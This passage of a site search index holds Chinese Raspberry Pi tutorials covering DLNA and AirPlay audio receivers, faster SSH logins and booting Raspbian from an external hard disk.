scripts/init.d/gmediarenderer /etc/init.d/ 2\u3001\u5efa\u7acb\u7528\u6237\u7ec4 useradd -g audio gmediarender 3\u3001\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 /etc/init.d/gmediarenderer DAEMON_USER=\"gmediarender:audio\" #\u7528\u6237\u7ec4UPNP_DEVICE_NAME=\"Raspberry-DLNA\" #\u670d\u52a1\u540d\u79f0 4\u3001\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f update-rc.d gmediarenderer defaults","title":"\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#airplay","text":"\u53c2\u8003\u6587\u6863\uff1a https://github.com/abrasive/shairport/wiki","title":"AirPlay \u534f\u8bae"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_5","text":"$ apt-get install libssl-dev libavahi-client-dev libasound2-dev libao-dev libpulse-dev","title":"\u5b89\u88c5\u4f9d\u8d56"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#airplay_1","text":"1\u3001\u5b9a\u4f4d\u5230 home \u6587\u4ef6\u5939\u514b\u9686\u7a0b\u5e8f\u6e90\u7801\u5e76\u5b89\u88c5 $ cd ../home/$ git clone https://github.com/abrasive/shairport.git$ cd shairport$ sudo make$ sudo make install 2\u3001\u542f\u52a8\u670d\u52a1\u7528\u82f9\u679c\u5bb6\u65cf\u8bbe\u5907\u6d4b\u8bd5\u4e00\u4e0b\u80fd\u5426\u6b63\u5e38\u64ad\u653e $ ./shairport -a Raspberry-AirPlay","title":"\u5b89\u88c5 AirPlay"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_6","text":"1\u3001\u62f7\u8d1d\u76f8\u5173\u914d\u7f6e\u6587\u4ef6 $ cp scripts/debian/default/shairport /etc/default/$ cp scripts/debian/init.d/shairport /etc/init.d/$ cp scripts/debian/logrotate.d/shairport /etc/logrotate.d/ 2\u3001\u5efa\u7acb\u7528\u6237\u7ec4 useradd -g audio shairport 3\u3001\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 /etc/init.d/shairport USER=shairport #\u7528\u6237GROUP=audio #\u7528\u6237\u7ec4AP_NAME=Raspberry-AirPlay #\u670d\u52a1\u540d\u79f0 4\u3001\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f update-rc.d shairport defaults","title":"\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_7","text":"","title":"\u6700\u7ec8\u6548\u679c"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_8","text":"http://raspberrypihq.com/how-to-turn-your-raspberry-pi-into-a-airplay-receiver-to-stream-music-from-your-iphone/ https://blog.wanghw.cn/archives/raspberry-wifisoundtrack.html https://github.com/hzeller/gmrender-resurrect/blob/master/INSTALL.md https://github.com/abrasive/shairport/wiki \u539f\u6587\u94fe\u63a5\uff1a https://www.hscbook.com/article/raspberrypi-audio/","title":"\u66f4\u591a\u6559\u7a0b"},{"location":"RPI/%E8%A7%A3%E5%86%B3%E6%A0%91%E8%8E%93%E6%B4%BESSH%E7%99%BB%E5%BD%95%E7%BC%93%E6%85%A2%E7%9A%84%E9%97%AE%E9%A2%98_Maoning%20Guan%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2/","text":"\u89e3\u51b3\u6811\u8393\u6d3eSSH\u767b\u5f55\u7f13\u6162\u7684\u95ee\u9898_Maoning Guan\u7684\u535a\u5ba2-CSDN\u535a\u5ba2 \u7cfb\u7edf\uff1a \u6811\u8393\u6d3e\uff1a\u6811\u8393\u6d3e3\u4ee3B \u7cfb\u7edf\uff1araspbian \u95ee\u9898\uff1a \u6211\u4eec\u5728\u7528SSH\u767b\u5f55\u6811\u8393\u6d3e\u7684\u65f6\u5019\uff0c\u8f93\u5165\u7528\u6237\u540d\u4e4b\u540e\uff0c\u5f80\u5f80\u9700\u8981\u7b49\u5f8510\u591a\u79d2\u751a\u81f320\u591a\u79d230\u79d2\u624d\u80fd\u5f39\u51fa\u8f93\u5165\u5bc6\u7801\u7684\u9009\u9879\uff0c\u8fd9\u4e2a\u662f\u56e0\u4e3a\u6811\u8393\u6d3e\u5f00\u542f\u4e86gssapi\u8ba4\u8bc1\uff0cgsspi\u662f\u4e00\u79cd\u5de5\u4e1a\u6807\u51c6\u534f\u8bae\uff0c\u53ef\u7528\u4e8eSSH\u8fde\u63a5\u8ba4\u8bc1\u3002 \u89e3\u51b3\u65b9\u6cd5\uff1a \u6240\u4ee5\u4e3a\u4e86\u51cf\u5c11\u7b49\u5f85\u7684\u65f6\u95f4\uff0c\u6211\u4eec\u53ea\u9700\u8981\u628a\u6811\u8393\u6d3e\u7684gssapi\u8ba4\u8bc1\u5173\u95ed\u5373\u53ef\u3002 1\u3001\u5173\u95edssh\u7684gssapi\u8ba4\u8bc1 sudo nano /etc/ssh/ssh_config \u8fdb\u5165ssh_config\u6587\u4ef6\u8fdb\u884c\u7f16\u8f91\uff0c\u5728\u8be5\u6587\u4ef6\u7684\u672b\u5c3e\u627e\u5230\u8fd9\u4e24\u884c\u8bbe\u7f6e\u5e76\u6ce8\u91ca\u6389\uff0c\u7ed3\u679c\u5982\u4e0b\uff1a # GSSAPIAuthentication yes # GSSAPIDelegateCredentials no \u7136\u540eCtrl+x\u9000\u51fa\u7f16\u8f91\uff0c\u8f93\u5165y\u9009\u62e9\u4fdd\u5b58\u6587\u4ef6\uff0c\u6700\u540e\u56de\u8f66\u5373\u53ef\u3002 2\u3001 \u5173\u95edssh\u7684UseDNS sudo nano /etc/ssh/sshd_config \u8fdb\u5165sshd_config\u6587\u4ef6\u8fdb\u884c\u7f16\u8f91\uff0c\u5728\u8be5\u6587\u4ef6\u7684\u672b\u5c3e\u52a0\u5165\u4ee5\u4e0b\u4ee3\u7801\uff1a UseDNS no \u7136\u540eCtrl+x\u9000\u51fa\u7f16\u8f91\uff0c\u8f93\u5165y\u9009\u62e9\u4fdd\u5b58\u6587\u4ef6\uff0c\u6700\u540e\u56de\u8f66\u5373\u53ef\u3002 3\u3001\u6700\u540e\u91cd\u542f\u6811\u8393\u6d3e\u5373\u53ef\uff1a sudo reboot 4\u3001\u6d4b\u8bd5 \u91cd\u65b0\u7528SSH\u8fde\u63a5\u6811\u8393\u6d3e\u7684\u65f6\u5019\uff0c\u5f53\u8f93\u5165\u7528\u6237\u540d\u4e4b\u540e\uff0c\u77ac\u95f4\u5c31\u4f1a\u5f39\u51fa\u8981\u6c42\u8f93\u5165\u5bc6\u7801\u7684\u9009\u9879\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/guanmaoning/article/details/80283012","title":"\u89e3\u51b3\u6811\u8393\u6d3eSSH\u767b\u5f55\u7f13\u6162\u7684\u95ee\u9898 Maoning Guan\u7684\u535a\u5ba2 CSDN\u535a\u5ba2"},{"location":"RPI/%E8%A7%A3%E5%86%B3%E6%A0%91%E8%8E%93%E6%B4%BESSH%E7%99%BB%E5%BD%95%E7%BC%93%E6%85%A2%E7%9A%84%E9%97%AE%E9%A2%98_Maoning%20Guan%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2/#ssh_maoning-guan-csdn","text":"\u7cfb\u7edf\uff1a \u6811\u8393\u6d3e\uff1a\u6811\u8393\u6d3e3\u4ee3B \u7cfb\u7edf\uff1araspbian \u95ee\u9898\uff1a \u6211\u4eec\u5728\u7528SSH\u767b\u5f55\u6811\u8393\u6d3e\u7684\u65f6\u5019\uff0c\u8f93\u5165\u7528\u6237\u540d\u4e4b\u540e\uff0c\u5f80\u5f80\u9700\u8981\u7b49\u5f8510\u591a\u79d2\u751a\u81f320\u591a\u79d230\u79d2\u624d\u80fd\u5f39\u51fa\u8f93\u5165\u5bc6\u7801\u7684\u9009\u9879\uff0c\u8fd9\u4e2a\u662f\u56e0\u4e3a\u6811\u8393\u6d3e\u5f00\u542f\u4e86gssapi\u8ba4\u8bc1\uff0cgsspi\u662f\u4e00\u79cd\u5de5\u4e1a\u6807\u51c6\u534f\u8bae\uff0c\u53ef\u7528\u4e8eSSH\u8fde\u63a5\u8ba4\u8bc1\u3002 \u89e3\u51b3\u65b9\u6cd5\uff1a \u6240\u4ee5\u4e3a\u4e86\u51cf\u5c11\u7b49\u5f85\u7684\u65f6\u95f4\uff0c\u6211\u4eec\u53ea\u9700\u8981\u628a\u6811\u8393\u6d3e\u7684gssapi\u8ba4\u8bc1\u5173\u95ed\u5373\u53ef\u3002 1\u3001\u5173\u95edssh\u7684gssapi\u8ba4\u8bc1 sudo nano /etc/ssh/ssh_config \u8fdb\u5165ssh_config\u6587\u4ef6\u8fdb\u884c\u7f16\u8f91\uff0c\u5728\u8be5\u6587\u4ef6\u7684\u672b\u5c3e\u627e\u5230\u8fd9\u4e24\u884c\u8bbe\u7f6e\u5e76\u6ce8\u91ca\u6389\uff0c\u7ed3\u679c\u5982\u4e0b\uff1a # GSSAPIAuthentication yes # GSSAPIDelegateCredentials no \u7136\u540eCtrl+x\u9000\u51fa\u7f16\u8f91\uff0c\u8f93\u5165y\u9009\u62e9\u4fdd\u5b58\u6587\u4ef6\uff0c\u6700\u540e\u56de\u8f66\u5373\u53ef\u3002 2\u3001 \u5173\u95edssh\u7684UseDNS sudo nano /etc/ssh/sshd_config \u8fdb\u5165sshd_config\u6587\u4ef6\u8fdb\u884c\u7f16\u8f91\uff0c\u5728\u8be5\u6587\u4ef6\u7684\u672b\u5c3e\u52a0\u5165\u4ee5\u4e0b\u4ee3\u7801\uff1a UseDNS no \u7136\u540eCtrl+x\u9000\u51fa\u7f16\u8f91\uff0c\u8f93\u5165y\u9009\u62e9\u4fdd\u5b58\u6587\u4ef6\uff0c\u6700\u540e\u56de\u8f66\u5373\u53ef\u3002 3\u3001\u6700\u540e\u91cd\u542f\u6811\u8393\u6d3e\u5373\u53ef\uff1a sudo reboot 4\u3001\u6d4b\u8bd5 \u91cd\u65b0\u7528SSH\u8fde\u63a5\u6811\u8393\u6d3e\u7684\u65f6\u5019\uff0c\u5f53\u8f93\u5165\u7528\u6237\u540d\u4e4b\u540e\uff0c\u77ac\u95f4\u5c31\u4f1a\u5f39\u51fa\u8981\u6c42\u8f93\u5165\u5bc6\u7801\u7684\u9009\u9879\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/guanmaoning/article/details/80283012","title":"\u89e3\u51b3\u6811\u8393\u6d3eSSH\u767b\u5f55\u7f13\u6162\u7684\u95ee\u9898_Maoning Guan\u7684\u535a\u5ba2-CSDN\u535a\u5ba2"},{"location":"RPI/%E8%AE%BE%E7%BD%AE%E6%A0%91%E8%8E%93%E6%B4%BE%E4%BD%BF%E7%94%A8%E5%A4%96%E7%BD%AE%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8/","text":"\u8bbe\u7f6e\u6811\u8393\u6d3e\u4f7f\u7528\u5916\u7f6e\u786c\u76d8\u542f\u52a8 \u6574\u4ef6\u4e8b\u60c5\u662f\u8fd9\u6837\u7684\uff1a\u67d0\u4e00\u5929\u6211\u5c1d\u8bd5\u5728\u6811\u8393\u6d3e\u4e0a\u5b89\u88c5\u4e00\u4e2a vim \u7684\u7f16\u8f91\u5668\u63d2\u4ef6 YouCompleteMe \uff0c\u9700\u8981\u4ece\u6e90\u7801\u7f16\u8bd1\u3002\u7f16\u8bd1\u8fd9\u4e2a\u6bd4\u8f83\u8017\u8d39\u5185\u5b58\uff0c\u53ef\u80fd\u6211\u5206\u914d\u7684 SWAP \u4e0d\u591f\u5927\uff081024MB\uff09\uff0c\u5bfc\u81f4\u5185\u5b58\u4e0d\u8db3\uff0c\u7136\u540e sshd \u5c31\u6302\u4e86\u3002\u55ef\uff0c\u5e76\u4e14\u5df2\u7ecf\u8fc7\u53bb\u4e86\u4e00\u4e2a\u5c0f\u65f6\u6211\u4e5f\u6ca1\u6cd5\u8fde\u63a5\u4e0a\u53bb\u3002\u4e8e\u662f\u6211\u5c31\u62d4\u7535\u6e90\u91cd\u542f\u4e86\uff0c\u8fd9\u4e0b\u53ef\u597d\uff0cSD \u5361\u5f7b\u5e95\u542f\u52a8\u4e0d\u4e86\u4e86\uff0c\u4f30\u8ba1\u662f\u6587\u4ef6\u7cfb\u7edf\u635f\u574f\u4e4b\u7c7b\u7684\u3002\u4e0a\u7f51\u641c\u4e86\u4e00\u4e0b\u8fd9\u79cd\u73b0\u8c61\u4f3c\u4e4e\u975e\u5e38\u5e38\u89c1\uff0c\u53ea\u8981\u5728\u65ad\u7535\u65f6 SD \u5361\u8fd8\u5728\u5199\u5165\u5c31\u53ef\u80fd\u51fa\u73b0\u3002\u4e8e\u662f\u6211\u5c31\u60f3\u5230\u8981\u628a\u7cfb\u7edf\u88c5\u5728\u5916\u7f6e\u786c\u76d8\u4e0a\u3002 \u9996\u5148\u786c\u4ef6\u914d\u7f6e\u662f\u8fd9\u6837\u7684\uff1a\u6211\u624b\u4e0a\u6709 8GB \u548c 16GB \u7684 C10 SD \u5361\u5404\u4e00\u5f20\uff0c500GB \u7684\u79fb\u52a8\u786c\u76d8\u4e00\u4e2a\uff08\u4e4b\u524d\u7b14\u8bb0\u672c\u7684\u673a\u68b0\u786c\u76d8\uff0c\u6362 SSD \u7684\u65f6\u5019\u62c6\u4e0b\u6765\u88c5\u5728\u79fb\u52a8\u786c\u76d8\u76d2\u91cc\uff09\uff0c\u6709\u6e90 USB Hub \u4e00\u4e2a\uff0c\u6811\u8393\u6d3e\u4e00\u4e2a\u3002\u5176\u4e2d\u79fb\u52a8\u786c\u76d8\u4e0a\u6709\u4e24\u4e2a NTFS \u5206\u533a\uff08Windows \u7684 C\u76d8\u548c D\u76d8\uff09\u548c\u4e00\u4e2a ext4 \u5206\u533a\uff08\u5f88\u4e45\u4ee5\u524d\u7684 Ubuntu \u7cfb\u7edf\uff0c\u6240\u6709\u6570\u636e\u90fd\u5728\u91cc\u9762\uff09\u3002 \u6211\u60f3\u5b9e\u73b0\u7684\u6548\u679c\u662f\u8fd9\u6837\u7684\uff1a\u6e05\u7a7a\u65e7\u7684 Windows C\u76d8\uff0890GB\uff09\uff0c\u5206\u51fa 30GB \u7ed9 Raspbian\uff0c\u7136\u540e\u6811\u8393\u6d3e\u8981\u4ece\u786c\u76d8\u542f\u52a8\u3002 \u7b80\u5355\u641c\u7d22\u4e86\u4e00\u4e0b\u53d1\u73b0\u76f4\u63a5\u4ece\u786c\u76d8\u542f\u52a8\u662f\u4e0d\u884c\u7684\uff0c\u56e0\u4e3a\u6811\u8393\u6d3e\u542f\u52a8\u7684\u65f6\u5019\u56fa\u5b9a\u662f\u4ece SD \u5361\u7684\u7b2c\u4e00\u4e2a\u5206\u533a\uff08/boot\uff09\u8bfb\u53d6 config.txt \u3001 cmdline.txt \u548c kernel.img \u8fd9\u4e09\u4e2a\u6587\u4ef6\u3002\u4f46\u662f\u9664\u6b64\u4e4b\u5916\uff0c\u5404\u4e2a\u5916\u63a5\u8bbe\u5907\u7684\u6302\u8f7d\u70b9\u5219\u662f\u6ca1\u6709\u9650\u5236\u7684\u3002\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u5c06 /boot \u5206\u533a\u653e\u5728 SD \u5361\u4e0a\uff0c\u5e76\u8bbe\u7f6e\u4e3a\u53ea\u8bfb\u7684\uff0c\u907f\u514d\u610f\u5916\u5173\u673a\u65f6\u635f\u574f\u4e0a\u9762\u7684\u6587\u4ef6\u7cfb\u7edf\uff1b\u540c\u65f6\u6211\u4eec\u628a\u7cfb\u7edf\u7684\u5176\u4ed6\u90e8\u5206\u90fd\u653e\u5728\u5916\u7f6e\u786c\u76d8\u4e0a\uff0c\u901a\u8fc7 USB \u8fde\u63a5\u5230\u6811\u8393\u6d3e\uff0c\u8fd9\u90e8\u5206\u662f\u53ef\u8bfb\u5199\u7684\u3002 \u6211\u4eec\u9996\u5148\u6309\u7167\u6b63\u5e38\u65b9\u5f0f\uff0c\u4ece\u6811\u8393\u6d3e\u7684\u7f51\u7ad9\u4e0a \u4e0b\u8f7d Raspbian \u955c\u50cf\uff0c\u6309\u7167 \u5b98\u65b9\u7684\u6307\u5bfc \uff0c\u5b89\u88c5\u5230 SD \u5361\u4e0a\u3002\u8fd9\u91cc\u7b80\u8981\u8bf4\u4e00\u4e0b\u5728 Mac OS X \u4e0a\u7684\u5b89\u88c5\u65b9\u5f0f\uff1a # \u9996\u5148\u5c06 SD \u5361\u63d2\u5165\u9002\u914d\u5668\uff0c\u8fde\u63a5\u5230 Mac # \u6253\u5f00\u7ec8\u7aef # \u5728\u5217\u51fa\u7684\u78c1\u76d8\u4e2d\u627e\u5230\u4f60\u7684 SD \u5361\u8bbe\u5907\uff0c\u4f8b\u5982 /dev/disk4 diskutil list # unmount diskutil unmountDisk /dev/disk4 # \u8fd9\u91cc\u66ff\u6362\u6210\u4f60\u7684 SD \u5361\u8bbe\u5907 # \u627e\u5230\u4f60\u4e0b\u8f7d\u7684\u955c\u50cf\uff08\u89e3\u538b\u7684 .img \u6587\u4ef6\uff09\uff0c\u5199\u5165\u5230\u4f60\u7684 SD \u5361\u8bbe\u5907 sudo dd bs=1m if=image.img of=/dev/rdisk4 # \u8fd9\u91cc\u6ce8\u610f\u662f rdisk # \u5199\u5165\u5b8c\u6210\u540e\u4ece Finder \u91cc\u5f39\u51fa SD \u5361\u5c31\u597d\u4e86 \u7136\u540e\u6309\u7167\u6b63\u5e38\u65b9\u5f0f\u8fdb\u884c\u7b2c\u4e00\u6b21\u542f\u52a8\uff0c\u4e5f\u53ef\u4ee5\u505a\u4e00\u4e9b\u7b80\u5355\u8bbe\u7f6e\u7684\u8c03\u6574\u3002\u6211\u662f\u63a5\u4e86\u952e\u76d8\u548c\u663e\u793a\u5668\u542f\u52a8\u7684\uff0c\u8fdb\u53bb\u540e\u9996\u5148\u6253\u5f00 raspi-config \u628a\u56fe\u5f62\u754c\u9762\u5173\u6389\u4e86\uff0c\u7136\u540e\u6253\u5f00\u4e86\u6444\u50cf\u5934\u3001I2C \u548c SPI \u8bbe\u5907\uff0c\u7136\u540e\u6211\u5c31\u91cd\u542f\u4e86\u3002\u63a5\u4e0b\u6765\u6211\u90fd\u662f\u901a\u8fc7 ssh \u8fdb\u884c\u7684\u64cd\u4f5c\u3002 \u901a\u8fc7 USB \u8fde\u63a5\u79fb\u52a8\u786c\u76d8\u3002 sudo fdisk -l \u770b\u4e00\u4e0b\u662f\u54ea\u4e2a\u8bbe\u5907\uff0c\u4e00\u822c\u90fd\u662f /dev/sda \u4e4b\u7c7b\u7684\u3002 \u5982\u679c\u6709\u4e0d\u60f3\u8981\u7684\u5206\u533a\u9700\u8981\u5220\u6389\u817e\u51fa\u7a7a\u95f4\u7684\u8bdd\uff0c sudo fdisk /dev/sda \u6253\u5f00 fdisk \u5de5\u5177\uff0c\u628a\u4e0d\u8981\u7684\u5206\u533a\u5220\u6389\uff0c\u65b0\u5efa\u4e00\u4e2a 30GB \u5206\u533a\u3002\u5177\u4f53\u600e\u4e48\u64cd\u4f5c\uff0c\u4ea4\u4e92\u6a21\u5f0f\u4e0b\u6709\u5e2e\u52a9\uff0c\u6ce8\u610f\u4e0d\u8981\u5220\u6389\u4e86\u60f3\u4fdd\u7559\u7684\u5206\u533a\u5373\u53ef\u3002\u5728\u4f60\u8f93\u5165 w \u547d\u4ee4\u6267\u884c\u5199\u5165\u4e4b\u524d\uff0c\u6240\u6709\u6539\u52a8\u90fd\u662f\u5728\u5185\u5b58\u4e2d\u7684\uff0c\u4f60\u89c9\u5f97\u6709\u95ee\u9898\u7684\u8bdd\uff0c Ctrl-C \u9000\u51fa\u91cd\u6765\u5c31\u597d\u3002 \u521b\u5efa\u597d\u5206\u533a\u4e4b\u540e\u683c\u5f0f\u5316\u6210 ext4\uff1a sudo mkfs.ext4 /dev/sda1 \u3002 \u8fd0\u884c sudo gdisk /dev/sda \u8fdb\u5165 gdisk \u5de5\u5177\u7684\u4ea4\u4e92\u6a21\u5f0f\u3002\u5728\u8fd9\u91cc\u68c0\u89c6\u4e00\u4e0b\u4f60\u60f3\u7528\u4e8e Raspbian \u7684\u5206\u533a\uff0c\u83b7\u53d6\u5230 UUID\u3002\u4ee5\u4e0b\u4f8b\u5b50\u6765\u81ea Stefan\u2019s Blog root@raspberrypi:/home/pi# gdisk /dev/sda GPT fdisk (gdisk) version 0.8.5 Partition table scan: MBR: hybrid BSD: not present APM: not present GPT: present Found valid GPT with hybrid MBR; using GPT. Command (? for help): i Partition number (1-3): 2 Partition GUID code: 0FC63DAF-8483-4772-8E79-3D69D8477DE4 (Linux filesystem) Partition unique GUID: 176ADF0D-357D-4C4B-ADC0-371342F444AB First sector: 2099200 (at 1.0 GiB) Last sector: 23070719 (at 11.0 GiB) Partition size: 20971520 sectors (10.0 GiB) Attribute flags: 0000000000000000 Partition name: '' Command (? for help): q UUID \u662f\u8ddf\u5728 \u201cPartition unique GUID\u201d \u540e\u9762\u90a3\u4e32\u5b57\u6bcd\uff0c\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\u4e5f\u5c31\u662f 176ADF0D-357D-4C4B-ADC0-371342F444AB \u3002 \u63a5\u4e0b\u6765\u7f16\u8f91 /boot/cmdline.txt \uff0c\u5c06\u5176\u4e2d root=/dev/mmcblk0p2 \u6539\u4e3a root=PARTUUID=\u5206\u533a\u7684UUID \u7136\u540e\u4fdd\u5b58\u3002 \u968f\u540e\uff0c\u7f16\u8f91 /etc/fstab \u5c06 /boot \u6302\u8f7d\u4e3a\u53ea\u8bfb\u6a21\u5f0f\uff0c\u5c06\u79fb\u52a8\u786c\u76d8\u4e5f\u6dfb\u52a0\u8fdb\u53bb\uff0c\u6302\u8f7d\u4e3a\u53ef\u8bfb\u5199\u3002\u9ed8\u8ba4\u7684\u5185\u5bb9\u662f\u8fd9\u6837\u7684\uff1a proc /proc proc defaults 0 0 /dev/mmcblk0p1 /boot vfat defaults 0 2 /dev/mmcblk0p2 / ext4 defaults,noatime 0 1 # a swapfile is not a swap partition, no line here # use dphys-swapfile swap[on|off] for that \u66f4\u6539\u4e4b\u540e\u5185\u5bb9\u5927\u6982\u50cf\u8fd9\u6837\uff1a proc /proc proc defaults 0 0 /dev/mmcblk0p1 /boot vfat ro 0 2 /dev/sda1 / ext4 defaults,errors=remount-ro 0 1 #/dev/mmcblk0p2 / ext4 defaults,noatime 0 1 # a swapfile is not a swap partition, no line here # use dphys-swapfile swap[on|off] for that \u6700\u540e\uff0c\u5c06 / \u4e0b\u7684\u5185\u5bb9\u5168\u90e8\u5199\u5165\u5230\u79fb\u52a8\u786c\u76d8\u4e2d\u3002\u4ee5\u6211\u81ea\u5df1\u7684\u914d\u7f6e\u4e3a\u4f8b\uff0c\u4f7f\u7528 /dev/sda1 \u5206\u533a\uff1a dd if=/dev/mmcblk0p2 of=/dev/sda1 \u56e0\u4e3a Raspbian \u9ed8\u8ba4\u662f\u5c06 SD \u5361\u7684\u7b2c\u4e8c\u4e2a\u5206\u533a\uff08\u4e5f\u5c31\u662f /dev/mmcblk0p2 \uff09\u6302\u8f7d\u5230 / \u7684\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u4ece\u8fd9\u4e2a\u5206\u533a\u8bfb\u53d6\uff0c\u5199\u5165\u5230\u76ee\u6807\u5206\u533a\u5c31\u53ef\u4ee5\u3002 \u5199\u5165\u5b8c\u6210\u4e4b\u540e\uff0c /dev/sda1 \u7684\u5927\u5c0f\u4e0e /dev/mmcblk0p2 \u662f\u5b8c\u5168\u4e00\u81f4\u7684\uff0c\u4f1a\u8fdc\u8fdc\u5c0f\u4e8e\u4f60\u521b\u5efa\u8fd9\u4e2a\u5206\u533a\u65f6\u6307\u5b9a\u7684\u5927\u5c0f\u3002\u53ef\u4ee5\u4f7f\u7528 sudo resize2fs /dev/sda1 \u6765\u5c55\u5f00\u5230\u5b8c\u6574\u7684\u5927\u5c0f\u3002 \u63a5\u4e0b\u6765\u91cd\u542f\u5c31\u597d\u4e86\u3002 \u5728\u8fc7\u7a0b\u4e2d\u5982\u679c\u4e0d\u614e\u4fee\u6539\u9519\u4e86\u53c2\u6570\uff0c\u6216\u8005\u5c06\u4e0d\u6b63\u786e\u7684\u5206\u533a\u6302\u8f7d\u4e3a\u53ea\u8bfb\u4e86\uff0c\u4e0d\u5fc5\u60ca\u614c\uff0c\u4e5f\u4e0d\u9700\u8981\u9a6c\u4e0a\u91cd\u88c5\u7cfb\u7edf\u3002\u53ea\u8981\u5c06\u6811\u8393\u6d3e\u65ad\u7535\uff0cSD \u5361\u62d4\u51fa\u6765\u8fde\u63a5\u5230\u522b\u7684\u7535\u8111\u4e0a\uff0c\u4fee\u6539 /boot/cmdline.txt \u91cc\u7684\u53c2\u6570\uff0c\u6539\u4e3a\u9ed8\u8ba4\u7684\u6302\u8f7d SD \u5361\u7b2c\u4e8c\u5206\u533a\u5373\u53ef\u3002\u91cd\u542f\u540e\u53ef\u4ee5\u901a\u8fc7 sudo mount -o remount,rw /dev/sda1 \u5c06 /etc/fstab \u4e2d\u6307\u5b9a\u7684\u5206\u533a\u91cd\u65b0\u6302\u8f7d\u4e3a\u53ef\u8bfb\u5199\u6a21\u5f0f\u6765\u8fdb\u884c\u4fee\u6539\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://blog.mynook.info/post/boot-raspberrypi-from-external-hdd/","title":"\u8bbe\u7f6e\u6811\u8393\u6d3e\u4f7f\u7528\u5916\u7f6e\u786c\u76d8\u542f\u52a8"},{"location":"RPI/%E8%AE%BE%E7%BD%AE%E6%A0%91%E8%8E%93%E6%B4%BE%E4%BD%BF%E7%94%A8%E5%A4%96%E7%BD%AE%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8/#_1","text":"\u6574\u4ef6\u4e8b\u60c5\u662f\u8fd9\u6837\u7684\uff1a\u67d0\u4e00\u5929\u6211\u5c1d\u8bd5\u5728\u6811\u8393\u6d3e\u4e0a\u5b89\u88c5\u4e00\u4e2a vim \u7684\u7f16\u8f91\u5668\u63d2\u4ef6 YouCompleteMe \uff0c\u9700\u8981\u4ece\u6e90\u7801\u7f16\u8bd1\u3002\u7f16\u8bd1\u8fd9\u4e2a\u6bd4\u8f83\u8017\u8d39\u5185\u5b58\uff0c\u53ef\u80fd\u6211\u5206\u914d\u7684 SWAP \u4e0d\u591f\u5927\uff081024MB\uff09\uff0c\u5bfc\u81f4\u5185\u5b58\u4e0d\u8db3\uff0c\u7136\u540e sshd \u5c31\u6302\u4e86\u3002\u55ef\uff0c\u5e76\u4e14\u5df2\u7ecf\u8fc7\u53bb\u4e86\u4e00\u4e2a\u5c0f\u65f6\u6211\u4e5f\u6ca1\u6cd5\u8fde\u63a5\u4e0a\u53bb\u3002\u4e8e\u662f\u6211\u5c31\u62d4\u7535\u6e90\u91cd\u542f\u4e86\uff0c\u8fd9\u4e0b\u53ef\u597d\uff0cSD \u5361\u5f7b\u5e95\u542f\u52a8\u4e0d\u4e86\u4e86\uff0c\u4f30\u8ba1\u662f\u6587\u4ef6\u7cfb\u7edf\u635f\u574f\u4e4b\u7c7b\u7684\u3002\u4e0a\u7f51\u641c\u4e86\u4e00\u4e0b\u8fd9\u79cd\u73b0\u8c61\u4f3c\u4e4e\u975e\u5e38\u5e38\u89c1\uff0c\u53ea\u8981\u5728\u65ad\u7535\u65f6 SD \u5361\u8fd8\u5728\u5199\u5165\u5c31\u53ef\u80fd\u51fa\u73b0\u3002\u4e8e\u662f\u6211\u5c31\u60f3\u5230\u8981\u628a\u7cfb\u7edf\u88c5\u5728\u5916\u7f6e\u786c\u76d8\u4e0a\u3002 